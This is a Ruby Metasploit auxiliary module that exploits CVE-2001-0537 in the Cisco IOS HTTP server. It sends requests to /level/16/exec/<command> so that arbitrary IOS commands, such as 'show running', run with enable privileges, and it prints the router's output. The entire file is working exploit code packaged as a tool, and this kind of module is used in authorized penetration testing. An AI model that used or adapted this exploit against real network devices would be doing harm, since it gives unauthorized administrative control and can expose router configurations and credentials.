##
# $Id$
##

require 'msf/core'

module Msf

class Auxiliary::Admin::Cisco::Ioshttp < Msf::Auxiliary

	include Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'		=> 'Cisco IOS HTTP Access Level',
			'Description'	=> %q{
				Cisco devices running IOS HTTP server may provide level 15 
				(enable) access when passed a level between 16 and 99.
			},
			'Author'	=> 'grutz',
			'License'	=> BSD_LICENSE,
			'Version'	=> '$Rev$',
			'References'	=> [
						['BID', '2936'],
						['OSVDB', '578'],
						['CVE', '2001-0537'],
						['URL', 'http://www.cisco.com/warp/public/707/IOS-httplevel-pub.html'],
			]
		)

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('CMD', [ true, 'IOS Command to execute', 'show running'] ),
				OptString.new('LEVEL', [ true, 'Enable level', 16] ),
				OptString.new('USER', [ false, 'Username'] ),
				OptString.new('PASS', [ false, 'Password'] ),
			], self.class
		)
	end

	def run

		cmd = datastore['CMD'].sub(' ', '/')	# change spaces to /
		user = datastore['USER']
		pass = datastore['PASS']
		if (user == nil && pass == nil)
			auth_str = ''
		else
			auth_str = "#{user}:#{pass}"
		end
		print_status("Sending command: #{cmd}")

		res = send_request_raw(
			{
				'uri' => '/level/' + datastore['LEVEL'] + '/exec/' + cmd,
				'basic_auth' => auth_str ? auth_str : '',
			}, 5)

		if res == nil
			print_status("sumptin borked")
		else
			if res.code == 200
				print_status("Received:\n\n#{res.body}")
			else
				print_status("Error: #{res.code}")
			end
		end
	end

end
end
